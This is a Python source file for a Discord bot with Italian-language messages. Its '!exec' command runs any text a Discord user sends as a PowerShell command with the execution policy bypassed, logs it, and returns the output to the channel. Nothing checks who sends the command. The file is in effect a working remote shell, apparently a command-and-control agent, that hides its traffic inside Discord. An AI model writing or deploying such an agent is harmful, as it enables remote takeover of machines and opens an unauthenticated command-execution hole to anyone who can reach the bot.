import discord
from discord.ext import commands
import subprocess
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
FILE_LOG = 'output_log.txt'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Agent online come {bot.user}')

@bot.command()
async def exec(ctx, *, command):
    powershell_command = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", command]
    
    try:
        result = subprocess.run(
            powershell_command, 
            capture_output=True, 
            text=True, 
            encoding='utf-8', 
            errors='ignore'
        )
        
        output = result.stdout + result.stderr
    
        if not output:
            output = "Comando eseguito con successo (nessun output)."

    except Exception as e:
        output = f"Errore nell'esecuzione: {str(e)}"

    with open(FILE_LOG, 'a') as f:
        f.write(f"--- Comando: {command} ---\n{output}\n")

    await ctx.send(f"```powershell\n{output}\n```")

bot.run(TOKEN)